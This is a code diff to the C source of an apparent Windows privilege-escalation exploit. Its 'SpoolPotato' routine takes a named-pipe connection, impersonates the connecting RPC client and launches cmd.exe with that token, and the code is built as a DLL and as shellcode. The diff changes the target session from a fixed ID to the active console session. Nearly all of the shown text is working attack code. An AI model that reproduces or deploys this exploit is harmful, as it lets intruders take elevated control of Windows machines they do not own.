@@ -20,7 +20,7 @@
 //#define EXE_BUILD
 #define DLL_BUILD
 #define SHELLCODE_BUILD
-#define SESSION_ID 1
+//#define SESSION_ID 1
 #define COMMAND_LINE L"cmd.exe"
 #define INTERACTIVE_PROCESS FALSE
 #define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
@@ -47,7 +47,7 @@ void DebugLog(const wchar_t* Format, ...) {
     va_end(Args);
 #ifdef DLL_BUILD
     uint32_t dwMsgAnswer = 0;
-    WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
+    WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, WTSGetActiveConsoleSessionId(), (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
@@ -337,7 +337,7 @@ BOOL SpoolPotato() {
 #ifdef DEBUG
                 DebugLog(L"... recieved connection over named pipe");
 #endif
-                if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS)) {
+                if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, WTSGetActiveConsoleSessionId(), INTERACTIVE_PROCESS)) {
 #ifdef DEBUG
                     DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event file with WPAD client...");
 #endif
